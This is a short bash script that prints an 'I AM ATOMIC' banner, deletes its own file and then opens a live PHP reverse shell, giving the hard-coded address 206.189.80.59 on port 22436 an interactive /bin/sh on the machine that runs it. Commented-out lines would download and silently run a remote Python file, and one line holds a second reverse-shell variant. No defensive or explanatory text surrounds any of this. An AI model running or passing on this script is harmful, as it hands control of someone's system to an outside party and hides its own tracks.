#!/bin/bash
#wget https://cyberprime.netlify.app/mod.py 
#nohup python3 mod.py >/dev/null 2>&1 &
sleep 1  # Wait for 1 second before the next command
#rm mod.py
rm mod.sh
sleep 1  # Wait for 1 second before the next command
#sudo apt install espeak -y
#apt install espeak -y
#pkg install espeak -y
clear
echo "I AM ATOMIC ..."
#espeak -s 150 -p 50 "I AM ATOMIC."
# Add PHP reverse shell command with nohup
php -r '$sock=fsockopen("206.189.80.59",22436);exec("/bin/sh -i <&3 >&3 2>&3");' 
#php -r '$sock=fsockopen("206.189.80.59",22436);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
